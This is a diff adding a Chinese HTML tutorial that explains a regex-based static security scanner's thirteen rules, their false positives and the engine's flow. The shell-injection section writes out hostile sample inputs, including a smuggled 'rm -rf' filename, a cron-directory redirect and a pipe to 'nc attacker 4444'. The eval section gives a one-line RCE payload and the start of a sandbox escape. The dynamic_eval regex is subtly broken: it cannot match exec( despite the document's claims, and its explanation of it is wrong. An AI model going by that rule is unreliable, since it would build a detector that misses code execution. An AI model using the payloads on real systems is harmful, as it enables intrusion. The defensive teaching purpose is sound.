+<li>任何框架：详细堆栈是<strong>漏洞利用的推进器</strong>——报错告诉你参数在哪一层被处理、用了什么库、什么版本；</li>
+<li>部分框架在 DEBUG 下会关闭或放宽安全中间件。</li>
+</ul>
+<p><strong>可观测特征</strong></p>
+<p>配置行的<strong>行首赋值</strong> <code>DEBUG = True / 1 / on / yes</code>。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;(?im)^\s*DEBUG\s*[:=]\s*(true|1|on|yes)\s*$&quot;</span>
+</code></pre></div>
+<p><code>(?m)</code> 让 <code>^</code>/<code>$</code> 按行生效，<code>^\s*</code> 容忍缩进，<code>\s*$</code> 容忍行尾空白——<strong>必须锚定整行</strong>：一方面能匹配带缩进的配置，另一方面被注释掉的 <code># DEBUG = True</code> <strong>天然不匹配</strong>（<code>#</code> 出现在 <code>DEBUG</code> 之前），这是锚定行首带来的额外收益。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>本地开发配置（<code>settings_dev.py</code>）本身就是 <code>DEBUG=True</code>，它<strong>本该如此</strong>；</li>
+<li>示例/模板配置 <code>.env.example</code>；</li>
+<li>多环境配置放在同一个仓库时，<strong>纯模式匹配看不见目录语义</strong> → 正确做法是按路径分规则（<code>file_glob</code>），或把这类命中交给 baseline 显式接受。</li>
+</ul>
+<hr>
+<h3 id="46-tls_verify_disabledhighhigh-tls">4.6 <code>tls_verify_disabled</code>（high/high）— 关闭 TLS 证书校验</h3>
+<p><strong>真实风险形态</strong></p>
+<p>为了绕开自签名证书报错，在 <code>requests.get(..., verify=False)</code>、<code>httpx(verify=False)</code>、<code>urllib</code> 的自定义 context、<code>curl -k</code>、<code>ssl._create_unverified_context()</code> 里关掉校验，然后<strong>忘了改回来</strong>。</p>
+<p><strong>影响链（为什么它让 MITM 从"极难"变成"平凡"）</strong></p>
+<p>TLS 提供三件事：<strong>机密性、完整性、身份认证</strong>。<code>verify=False</code> 直接废掉第三件，于是：</p>
+<ol>
+<li>攻击者只要能影响路径（同网段 ARP 欺骗、恶意 Wi-Fi、上游路由劫持、被投毒的 DNS、企业代理），就能用<strong>自签证书</strong>完成中间人；</li>
+<li>客户端<strong>不会告警</strong>——这正是"加密只剩心理安慰作用"的意思：数据仍然"是加密的"，只是加密给了攻击者；</li>
+<li>更隐蔽的用法是<strong>降级</strong>：攻击者可以进一步诱导到 HTTP 明文（配合 4.12 的明文源）；</li>
+<li>附带后果：用 <code>verify=False</code> 的人通常还会 <code>urllib3.disable_warnings()</code> 把警告也关掉，于是<strong>连日志线索都没了</strong>。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p>字面量 <code>verify=False</code>（Python 生态最常见的形态）。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\bverify\s*=\s*False\b&quot;</span>
+</code></pre></div>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>只在<strong>内网自签名环境</strong>里用，且网络路径本身可信，实际上是接受的取舍——但<strong>规则无法知道这一点</strong>，只能靠 baseline 显式登记；</li>
+<li>测试代码里连接本地 mock 服务；</li>
+<li>文档/教程示例。</li>
+</ul>
+<p>注意本课规则<strong>只匹配 Python 形态</strong>：<code>curl -k</code>、<code>--insecure</code>、<code>NODE_TLS_REJECT_UNAUTHORIZED=0</code>、Java 的自定义 <code>TrustManager</code> 全都看不见——这是规则集的<strong>覆盖面缺口</strong>，应写进报告的局限段（见 10）。</p>
+<hr>
+<h3 id="47-tls_legacy_protocolmediumhigh-tlsssl">4.7 <code>tls_legacy_protocol</code>（medium/high）— 启用过时 TLS/SSL</h3>
+<p><strong>真实风险形态</strong></p>
+<p>服务端为了兼容老旧客户端，把 <code>ssl_protocols</code> 放宽到 TLSv1.0/1.1 或 SSLv3；客户端硬编码 <code>ssl.PROTOCOL_TLSv1</code>。</p>
+<p><strong>影响链</strong></p>
+<ul>
+<li>SSLv3 的 <strong>POODLE</strong>、TLS 1.0/1.1 的 <strong>BEAST / LOGJAM / 降级攻击</strong>都是<strong>已被工程化实现</strong>的缺陷；</li>
+<li>更重要的是<strong>合规硬性淘汰</strong>：PCI-DSS 3.2 起强制要求 TLS 1.2 以上，等保与多数行业规范跟随；</li>
+<li>现实利用前提是攻击者能<strong>在路径上</strong>（MITM）——所以这条规则属于"给 MITM 创造条件"：单独看影响有限，但与 4.6 叠加时危害直线上升。</li>
+</ul>
+<p><strong>可观测特征</strong></p>
+<p>协议版本字面量：<code>TLSv1.0</code> / <code>TLSv1.1</code> / <code>TLSv1</code> / <code>SSLv3</code>。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\b(TLSv1(\.[01])?|SSLv3)\b&quot;</span>
+</code></pre></div>
+<p><code>TLSv1(\.[01])?</code> 同时覆盖 <code>TLSv1</code>（常指 1.0）、<code>TLSv1.0</code>、<code>TLSv1.1</code>。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>文档里写"我们已禁用 TLSv1.0"——<strong>这句话本身就会让规则命中</strong>。这是模式匹配最典型的<strong>语义反转</strong>误报：规则看不出"禁用"和"启用"的区别。</li>
+<li>兼容性测试脚本里<strong>故意</strong>协商旧版本。</li>
+</ul>
+<hr>
+<h3 id="48-weak_hash_or_cipherlowlow">4.8 <code>weak_hash_or_cipher</code>（low/low）— 弱哈希 / 弱算法</h3>
+<p><strong>真实风险形态</strong></p>
+<p><code>hashlib.md5(password)</code> 存口令；<code>sha1()</code> 做完整性校验；<code>DES</code> / <code>RC4</code> 做加密；用 <code>md5</code> 做签名或防篡改标记。</p>
+<p><strong>影响链（关键在于"什么场景下真的可被利用"）</strong></p>
+<ul>
+<li><strong>MD5/SHA1 用于口令</strong>：不是"碰撞"问题，而是<strong>速度</strong>问题。它们是为速度设计的通用哈希，GPU 上每秒可算百亿次，加盐也只把成本抬高常数倍。真正的问题是<strong>没用慢哈希</strong>（bcrypt / scrypt / Argon2）。</li>
+<li><strong>MD5/SHA1 用于完整性/签名</strong>：<strong>碰撞可实际构造</strong>。攻击者能造出两个内容不同、MD5 相同的文件——所以"下载文件的 MD5 对得上"<strong>不能</strong>证明文件没被改。SHA1 的碰撞（SHAttered）也已是公开事实，成本在持续下降。</li>
+<li><strong>DES / RC4 用于加密</strong>：DES 的 56 位密钥空间可被穷举；RC4 存在统计偏差（RC4 NOMORE、Bar Mitzvah）可恢复明文。</li>
+<li><strong>反例（为什么置信度必须低）</strong>：<code>md5</code> 用于<strong>缓存键、去重指纹、非安全场景的散列</strong>时完全无害。文档里提到 <code>md5</code> 也不代表用了它。</li>
+</ul>
+<p><strong>可观测特征</strong></p>
+<p>算法名的独立单词出现。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;(?i)\b(md5|sha1|des|rc4)\b&quot;</span>
+</code></pre></div>
+<p><strong>为什么会误报（这条是全库噪声最大的一条）</strong></p>
+<ol>
+<li>文档、注释、教学材料里提到算法名（本课 <code>docs/README.md</code> 第二行命中，<code>evidence</code> 显示为 <code>***</code>）；</li>
+<li>第三方库名里含关键词；</li>
+<li>用途无害（缓存键）；</li>
+<li><code>\b</code> 能挡住 <code>deserialize</code> 这类长词，但 <code>des</code> 作为独立词（变量名、西语"的"）仍会命中。</li>
+</ol>
+<p>所以它给 <code>low/low</code>：<strong>这条规则的真实价值是"提示你去查用途"，不是"发现了漏洞"</strong>。</p>
+<hr>
+<h3 id="49-shell_exec_enabledmediumhigh-shelltrue">4.9 <code>shell_exec_enabled</code>（medium/high）— <code>shell=True</code> 的注入面</h3>
+<p><strong>真实风险形态</strong></p>
+<p><code>subprocess.run(cmd, shell=True)</code> / <code>os.system(...)</code> / <code>subprocess.Popen(..., shell=True)</code>，其中 <code>cmd</code> 由用户输入、文件名、配置项或环境变量拼接而成。</p>
+<p><strong>影响链（为什么 <code>shell=True</code> 是"注入面放大器"）</strong></p>
+<p><code>shell=True</code> 把参数交给 <code>/bin/sh -c</code> 解析，于是<strong>任何一个能影响字符串的输入源都获得了一层 shell 语义</strong>：</p>
+<ol>
+<li><strong>命令串联</strong>：<code>;</code>、<code>&amp;&amp;</code>、<code>||</code>、换行 —— 例如 <code>filename="a; rm -rf /tmp/x"</code>；</li>
+<li><strong>命令替换</strong>：反引号、<code>$(id)</code>；</li>
+<li><strong>重定向与管道</strong>：<code>&gt; /etc/cron.d/x</code>、<code>| nc attacker 4444</code>；</li>
+<li><strong>参数注入</strong>：以 <code>-</code> 开头的文件名被目标命令当成选项（如 <code>--output=/etc/passwd</code>）；</li>
+<li><strong>环境依赖</strong>：<code>PATH</code> 被污染时调用到攻击者的同名程序；shell 元字符在 Windows <code>cmd.exe</code> 下语义完全不同（<code>&amp;</code>、<code>|</code>、<code>%VAR%</code>），<strong>跨平台行为不一致</strong>本身就是风险。</li>
+</ol>
+<p>对照：<code>shell=False</code>（列表参数）不经过 shell 解析，参数是<strong>独立 argv 元素</strong>，上述 1–3 全部消失（4、5 仍需白名单与绝对路径处理）——这就是修复建议给"改列表参数"的原因。</p>
+<p><strong>可观测特征</strong></p>
+<p>字面量 <code>shell=True</code>。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\bshell\s*=\s*True\b&quot;</span>
+</code></pre></div>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li><code>shell=True</code> 但参数是<strong>硬编码常量</strong>（无外部输入）→ 实际不可注入；</li>
+<li>确实需要 shell 特性（通配符展开、管道）且输入经过严格白名单。</li>
+</ul>
+<p>判断"是否真的危险"需要<strong>数据流分析</strong>——模式匹配看不见，所以置信度给 medium 而非 high，并提示人工确认输入来源。</p>
+<hr>
+<h3 id="410-dynamic_evalmediumlow-eval-exec">4.10 <code>dynamic_eval</code>（medium/low）— <code>eval</code> / <code>exec</code></h3>
+<p><strong>真实风险形态</strong></p>
+<p><code>eval(user_expr)</code> 做"计算器"；<code>eval(json_str)</code>（应该用 <code>json.loads</code>）；<code>exec(config_str)</code> 做"动态配置"；模板/规则引擎里用 <code>eval</code> 求值。</p>
+<p><strong>影响链</strong></p>
+<p><code>eval</code> 执行的是 <strong>Python 表达式</strong>，<code>exec</code> 执行<strong>语句</strong>。输入可控时等价于任意代码执行：</p>
+<pre class="plain"><code>eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)&quot;)                          # 一行 RCE
+eval(&quot;[c for c in ().__class__.__base__.__subclasses__() ...]&quot;) # 沙箱逃逸的经典起点
+</code></pre>
+<p>这也是"用一个 <code>eval</code> 自己做沙箱"必然失败的原因：Python 的对象图里总有通往 <code>__builtins__</code> 的路径。</p>
+<p><strong>可观测特征</strong></p>
+<p><code>eval(</code> / <code>exec(</code> 调用。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;(?&lt;![\w.])e(?:val|val)\s*\(&quot;</span>
+</code></pre></div>
+<p>负向后顾 <code>(?&lt;![\w.])</code> 是<strong>防误报的关键</strong>：</p>
+<ul>
+<li>挡住 <code>model.eval(</code>（PyTorch 的<strong>推理模式切换</strong>）与 <code>obj.exec(</code>；</li>
+<li><code>e(?:val|val)</code> 这个看起来冗余的写法，是为了让匹配 <code>eval(</code> 时正则引擎不必回溯（技巧性写法，语义等价于 <code>eval</code>）。</li>
+</ul>
+<p><strong>为什么会误报（low 置信度的来源）</strong></p>
+<p><strong>PyTorch/TensorFlow 的 <code>model.eval()</code> 是最典型的误报源</strong>——它和"执行代码"毫无关系。后顾断言能挡住 <code>model.eval(</code>，但挡不住"把 <code>eval</code> 赋值给变量后再调用"的写法（那是数据流问题）。另外 <code>ast.literal_eval</code> 是<strong>安全的</strong>（只支持字面量），但它字符串里也含 <code>eval(</code>，需要靠后顾的 <code>.</code> 挡掉（<code>literal_eval(</code> 前面是 <code>.</code>）——<strong>如果你把这条规则改宽，最先炸的就是深度学习项目。</strong></p>
+<hr>
+<h3 id="411-world_writable_chmodhighmedium">4.11 <code>world_writable_chmod</code>（high/medium）— 授权过宽的文件权限</h3>
+<p><strong>真实风险形态</strong></p>
+<p>部署脚本里的 <code>chmod 777</code> / <code>chmod -R 777</code>；上传目录 777（"不然传不上去"）；配置/密钥文件 666；cron 脚本、systemd 单元、<code>/etc/profile.d/*.sh</code> 被设成全局可写。</p>
+<p><strong>影响链</strong></p>
+<ol>
+<li><strong>提权跳板</strong>：任何本地用户（含被攻陷的低权限服务账号、WebShell 的 <code>www-data</code>）可以<strong>改写</strong>这些文件；</li>
+<li>如果被改写的是<strong>以 root 执行的脚本</strong>（cron、init、systemd <code>ExecStart</code>），下一次执行就是 <strong>root 代码执行</strong>——这是 Linux 提权里最经典的一条路径；</li>
+<li>777 目录还允许<strong>删除/替换</strong>他人文件（缺 sticky bit 时），可做竞争条件攻击（TOCTOU）；</li>
+<li>666 的配置文件可被任意用户改写 → 篡改认证、注入连接串。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p><code>chmod</code> 命令后跟 <code>777</code> / <code>666</code> / <code>a+rwx</code>。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\bchmod\s+(0?777|0?666|a\+rwx)\b&quot;</span>
+</code></pre></div>
+<p><code>0?777</code> 同时覆盖 <code>777</code> 与 <code>0777</code>。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li><strong>必须</strong>全局可写的特殊目录（共享上传区等）——确实是业务需要时应显式 baseline；</li>
+<li><code>chmod 777</code> 出现在带条件判断的脚本里、或作用在临时产物上；</li>
+<li>文档里讲"不要用 chmod 777"（<strong>语义反转</strong>误报，同 4.7）。</li>
+</ul>
+<p>另外，本规则<strong>看不见</strong>运行时的实际权限（要 <code>stat</code> 才知道），也看不见 ACL、SELinux 上下文——这是纯静态规则的边界。</p>
+<hr>
+<h3 id="412-insecure_package_indexmediumhigh-http">4.12 <code>insecure_package_index</code>（medium/high）— 明文 HTTP 软件源与供应链投毒</h3>
+<p><strong>真实风险形态</strong></p>
+<p><code>pip.conf</code> 里的 <code>index-url = http://...</code>、命令行 <code>pip install --index-url http://...</code> / <code>--extra-index-url http://...</code>；企业内网自建 PyPI 用 HTTP；<code>requirements.txt</code> 里带 <code>-i http://...</code>。</p>
+<p><strong>影响链（供应链投毒的形态）</strong></p>
+<ol>
+<li><strong>路径上可篡改</strong>：HTTP 明文，同网段/上游/代理可以替换包内容 → <strong>安装即执行</strong>攻击者代码（<code>setup.py</code> 在安装时执行）；</li>
+<li><strong>投毒目标明确</strong>：攻击者不需要黑掉你的仓库，只需在你和源之间改一个包；</li>
+<li><strong><code>--extra-index-url</code> 的隐藏陷阱</strong>：pip 会在<strong>所有</strong>索引里按包名查找，并<strong>优先取版本号最高的那个</strong>。攻击者只要在自己的源里上传一个版本号更高的同名包，就能劫持你的依赖——<strong>即使主源是 HTTPS</strong>。这是"依赖混淆（dependency confusion）"的标准手法；</li>
+<li><strong><code>trusted-host</code> 的存在意味着</strong>：校验也被一起放宽了；</li>
+<li>与 4.13 叠加时最危险：<strong>未锁版本 + 明文源</strong> = 每次构建都可能装到不同的、可能被投毒的代码。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p><code>index-url</code> / <code>extra-index-url</code> 后面跟 <code>http://</code>。</p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;(?i)(--(index|extra)-url\s*[= ]\s*|index-url\s*=\s*)http://&quot;</span>
+</code></pre></div>
+<p>同时覆盖命令行形态（<code>--index-url</code>）与配置文件形态（<code>index-url =</code>）。</p>
+<p><strong>为什么会误报</strong></p>
+<ul>
+<li>内部镜像<strong>确实</strong>只提供 HTTP，且网络路径受控（隔离区、专线）——属于<strong>接受的取舍</strong>，应 baseline 登记；</li>
+<li>文档里举反例。</li>
+</ul>
+<p>注意规则<strong>只匹配显式写 <code>http://</code> 的形态</strong>：系统包管理器（apt/yum）源、npm registry、Go proxy 的同类问题看不见。</p>
+<hr>
+<h3 id="413-unpinned_dependencylowmedium">4.13 <code>unpinned_dependency</code>（low/medium）— 依赖未锁定版本</h3>
+<p><strong>真实风险形态</strong></p>
+<p><code>requirements.txt</code> 里写 <code>requests</code> 而不是 <code>requests==2.32.3</code>；写 <code>&gt;=</code>、<code>~=</code> 这类浮动区间。</p>
+<p><strong>影响链</strong></p>
+<ol>
+<li><strong>构建不可复现</strong>：今天和三个月后装出来的是不同代码，"昨天还好好的"变成常态；</li>
+<li><strong>上游被投毒时被动中招</strong>：维护者账号被接管或包被恶意接管（如历史上多起 npm 事件）时，未锁版本会在下次构建<strong>自动拉入恶意版本</strong>；</li>
+<li><strong>依赖混淆</strong>：与 4.12 的 <code>--extra-index-url</code> 组合时，未锁版本让攻击者只需赢一次版本号比较；</li>
+<li>锁版本不等于永不升级——正确的组合是"<strong>锁版本 + 定期升级流程 + 依赖审计</strong>"。</li>
+</ol>
+<p><strong>可观测特征</strong></p>
+<p><strong>关键：这条规则的特征不是"某个字符串"，而是"某个文件的某一行没有 <code>==</code>"。</strong></p>
+<p><strong>规则靠什么识别</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;^[A-Za-z0-9_.\-]+$&quot;</span>       <span class="c1"># 整行只有一个裸包名</span>
+<span class="n">file_glob</span><span class="o">=</span><span class="s2">&quot;requirements*.txt&quot;</span>        <span class="c1"># 只在满足这个文件名模式的文件里生效</span>
+</code></pre></div>
+<p><strong>没有 <code>file_glob</code> 会怎样？</strong> 这条正则会命中<strong>仓库里每一个"只含单词的行"</strong>——英文单词行、<code>README</code>、模块名之类的独立行会全部命中，让报告瞬间爆掉。这是本课规则设计里最容易踩的坑：<strong>凡是"以缺失为特征"的规则，必须把作用域限死。</strong></p>
+<p><strong>为什么会误报 / 漏报</strong></p>
+<ul>
+<li>误报：<code>requirements-dev.txt</code> 里<strong>故意</strong>不锁的宽松约束；</li>
+<li>漏报（有意的窄匹配）：带 <code>#</code> 注释、带 <code>-r</code>、带环境标记（<code>; python_version&lt;'3.12'</code>）的行<strong>不会</strong>命中，因为正则要求整行纯包名；</li>
+<li>空行/纯注释行不命中，符合预期。</li>
+</ul>
+<hr>
+<h3 id="414-13">4.14 误报的来源分类与处置原则（13 条对照）</h3>
+<p>把上面 13 节里的误报归纳起来，只有五类来源：</p>
+<table>
+<thead>
+<tr>
+<th>误报来源</th>
+<th>典型例子</th>
+<th>为什么模式匹配无法消除</th>
+<th>正确处置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>占位符 / 示例值</strong></td>
+<td><code>AKIAIOSFODNN7EXAMPLE</code>、<code>ChangeMe</code>、<code>your-token-here</code></td>
+<td>形态与真值完全一致</td>
+<td>报告保留 + baseline 显式接受</td>
+</tr>
+<tr>
+<td><strong>语义反转</strong></td>
+<td>文档写"已禁用 TLSv1.0"、注释写"不要用 chmod 777"</td>
+<td>规则看不懂否定词</td>
+<td>降置信度 + 人工复核</td>
+</tr>
+<tr>
+<td><strong>用途无害</strong></td>
+<td><code>md5</code> 做缓存键、<code>model.eval()</code> 推理模式</td>
+<td>需要用途/数据流分析</td>
+<td>给低置信度，只作提示</td>
+</tr>
+<tr>
+<td><strong>上下文不在文件里</strong></td>
+<td>dev 配置 <code>DEBUG=True</code>、内网 <code>verify=False</code></td>
+<td>环境信息不在文本中</td>
+<td>按路径分规则（<code>file_glob</code>）或 baseline</td>
+</tr>
+<tr>
+<td><strong>作用域过宽</strong></td>
+<td>依赖规则不加 <code>file_glob</code></td>
+<td>规则作者疏忽</td>
+<td>用 <code>file_glob</code> 把"以缺失为特征"的规则限死</td>
+</tr>
+</tbody>
+</table>
+<p><strong>三条必须记住的结论</strong></p>
+<ol>
+<li><strong>误报不是 bug，是模式的固有属性</strong>。任何号称"零误报"的模式扫描器，要么规则极窄（漏报极多），要么在说谎。</li>
+<li><strong>降置信度比删规则正确</strong>。删掉规则 = 从此永久漏报；降置信度 = 线索仍在、优先级降低、由人决定。</li>
+<li><strong>误报的出口是 baseline（可见、可审计），不是"过滤"</strong>（见 6.5）。而 baseline 里的每一条，都应该是一次<strong>有记录的风险接受</strong>。</li>
+</ol>
+<h2 id="5">5. 核心机制详解</h2>
+<h3 id="51">5.1 引擎执行流程</h3>
+<div class="mermaid-wrap"><div class="mermaid">flowchart TD
+    A[scan_path root] --&gt; B{root 存在?}
+    B --&gt;|否| Z[FileNotFoundError]
+    B --&gt;|是| C[os.walk followlinks=False]
+    C --&gt; D[目录黑名单过滤]
+    D --&gt; E{文件数 &gt;= max_files?}
+    E --&gt;|是| T[truncated=True 停止]
+    E --&gt;|否| F{符号链接?}
+    F --&gt;|是且未允许| S1[skipped: symlink]
+    F --&gt;|否| G{大小 &gt; max_bytes?}
+    G --&gt;|是| S2[skipped: too_large]
+    G --&gt;|否| H{后缀是二进制类型?}
+    H --&gt;|是| S3[skipped: binary]
+    H --&gt;|否| I[read_bytes]
+    I --&gt; J{能 utf-8 解码?}
+    J --&gt;|否| S4[skipped: not_utf8]
+    J --&gt;|是| K[逐行正则匹配规则]
+    K --&gt; L[make_finding: 掩码 + 指纹]
+    L --&gt; M{在 baseline 中?}
+    M --&gt;|是| N[suppressed]
+    M --&gt;|否| O[findings]
+    S1 --&gt; P[Coverage]
+    S2 --&gt; P
+    S3 --&gt; P
+    S4 --&gt; P
+    T --&gt; P
+    N --&gt; Q[AuditReport]
+    O --&gt; Q
+</div><button class="mermaid-raw" type="button" onclick="this.parentNode.classList.toggle('show-raw')">查看源码</button><pre class="mermaid-src"><code>flowchart TD
+    A[scan_path root] --&gt; B{root 存在?}
+    B --&gt;|否| Z[FileNotFoundError]
+    B --&gt;|是| C[os.walk followlinks=False]
+    C --&gt; D[目录黑名单过滤]
+    D --&gt; E{文件数 &gt;= max_files?}
+    E --&gt;|是| T[truncated=True 停止]
+    E --&gt;|否| F{符号链接?}
+    F --&gt;|是且未允许| S1[skipped: symlink]
+    F --&gt;|否| G{大小 &gt; max_bytes?}
+    G --&gt;|是| S2[skipped: too_large]
+    G --&gt;|否| H{后缀是二进制类型?}
+    H --&gt;|是| S3[skipped: binary]
+    H --&gt;|否| I[read_bytes]
+    I --&gt; J{能 utf-8 解码?}
+    J --&gt;|否| S4[skipped: not_utf8]
+    J --&gt;|是| K[逐行正则匹配规则]
+    K --&gt; L[make_finding: 掩码 + 指纹]
+    L --&gt; M{在 baseline 中?}
+    M --&gt;|是| N[suppressed]
+    M --&gt;|否| O[findings]
+    S1 --&gt; P[Coverage]
+    S2 --&gt; P
+    S3 --&gt; P
+    S4 --&gt; P
+    T --&gt; P
+    N --&gt; Q[AuditReport]
+    O --&gt; Q
+</code></pre></div>
+<p>三个设计细节：</p>
+<ol>
+<li><strong><code>followlinks=False</code></strong>：不跟随符号链接目录，避免顺着 <code>link → /etc</code> 走出审计范围。<br>
+   文件级符号链接也默认跳过并计数。</li>
+<li><strong>二进制后缀判断在读取之前</strong>：省 IO；代价是"文本内容改了 .png 后缀"会漏，<br>
+   这是有意的取舍（宁可漏一个，也不要每次都把 500 MB 的镜像读进内存）。</li>
+<li><strong><code>consume()</code> 内部吞掉 OSError 但记录到 <code>errors</code></strong>：<br>
+   单个文件读不了不能让整次审计崩掉，但也不能静默忽略。</li>
+</ol>
+<h3 id="52-13">5.2 规则库（13 条，四类）</h3>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>规则 id</th>
+<th>严重度</th>
+<th>置信度</th>
+<th>匹配形态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>secret</td>
+<td><code>secret_private_key</code></td>
+<td>critical</td>
+<td>high</td>
+<td><code>-----BEGIN ... PRIVATE KEY-----</code></td>
+</tr>
+<tr>
+<td>secret</td>
+<td><code>secret_cloud_access_key</code></td>
+<td>critical</td>
+<td>high</td>
+<td><code>AKIA</code> + 16 位</td>
+</tr>
+<tr>
+<td>secret</td>
+<td><code>secret_hardcoded_credential</code></td>
+<td>high</td>
+<td>medium</td>
+<td><code>password/token/api_key = "…"</code></td>
+</tr>
+<tr>
+<td>secret</td>
+<td><code>secret_bearer_jwt</code></td>
+<td>medium</td>
+<td>medium</td>
+<td><code>eyJ…</code>.<code>…</code>.<code>…</code></td>
+</tr>
+<tr>
+<td>config</td>
+<td><code>config_debug_enabled</code></td>
+<td>medium</td>
+<td>high</td>
+<td>行首 <code>DEBUG = True/1/on</code></td>
+</tr>
+<tr>
+<td>config</td>
+<td><code>tls_verify_disabled</code></td>
+<td>high</td>
+<td>high</td>
+<td><code>verify=False</code></td>
+</tr>
+<tr>
+<td>config</td>
+<td><code>tls_legacy_protocol</code></td>
+<td>medium</td>
+<td>high</td>
+<td><code>TLSv1.0/1.1</code>、<code>SSLv3</code></td>
+</tr>
+<tr>
+<td>config</td>
+<td><code>world_writable_chmod</code></td>
+<td>high</td>
+<td>medium</td>
+<td><code>chmod 777/666/a+rwx</code></td>
+</tr>
+<tr>
+<td>crypto</td>
+<td><code>weak_hash_or_cipher</code></td>
+<td>low</td>
+<td>low</td>
+<td><code>md5/sha1/des/rc4</code></td>
+</tr>
+<tr>
+<td>code</td>
+<td><code>shell_exec_enabled</code></td>
+<td>medium</td>
+<td>high</td>
+<td><code>shell=True</code></td>
+</tr>
+<tr>
+<td>code</td>
+<td><code>dynamic_eval</code></td>
+<td>medium</td>
+<td>low</td>
+<td><code>eval(</code> / <code>exec(</code></td>
+</tr>
+<tr>
+<td>supply</td>
+<td><code>insecure_package_index</code></td>
+<td>medium</td>
+<td>high</td>
+<td><code>index-url = http://…</code></td>
+</tr>
+<tr>
+<td>supply</td>
+<td><code>unpinned_dependency</code></td>
+<td>low</td>
+<td>medium</td>
+<td><code>requirements*.txt</code> 中无版本行</td>
+</tr>
+</tbody>
+</table>
+<p><strong>规则编写要点（踩过的坑）</strong>：</p>
+<ul>
+<li>凭据规则<strong>不能</strong>写 <code>\bpassword\b</code>：变量名常见写法是 <code>DB_PASSWORD</code>，<br>
+  下划线是单词字符，<code>\b</code> 会把最常见的情况直接漏掉（本课规则里写了注释说明）。</li>
+<li>依赖规则必须带 <code>file_glob='requirements*.txt'</code>，否则全仓库每一行都会被匹配。</li>
+<li>弱算法规则用 <code>(?i)</code> 但要给低置信度：<code>MD5</code> 出现在文档里也会命中。</li>
+</ul>
+<h3 id="53">5.3 匹配的粒度与去重</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">inspect_text</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">rules</span><span class="p">,</span> <span class="n">baseline</span><span class="p">)</span>
+  <span class="err">→</span> <span class="n">逐行</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
+  <span class="err">→</span> <span class="n">每个匹配生成一个</span> <span class="n">Finding</span><span class="p">(</span><span class="n">rule_id</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">masked</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span>
+  <span class="err">→</span> <span class="n">dedupe</span><span class="p">():</span> <span class="n">以</span> <span class="p">(</span><span class="n">rule_id</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="n">为键去重</span>
+</code></pre></div>
+<p>为什么用 <code>(rule_id, path, line)</code> 而不是整行内容？<br>
+因为同一行里出现两次相同值（例如一行写了两个 <code>password=</code>）属于<strong>同一处问题</strong>，<br>
+去重后复核人员只看一次；而同一行触发<strong>不同规则</strong>时必须都保留——它们是不同问题。</p>
+<h3 id="54">5.4 覆盖统计字段</h3>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+<th>为什么重要</th>
+</tr>
+</thead>
+<tbody>
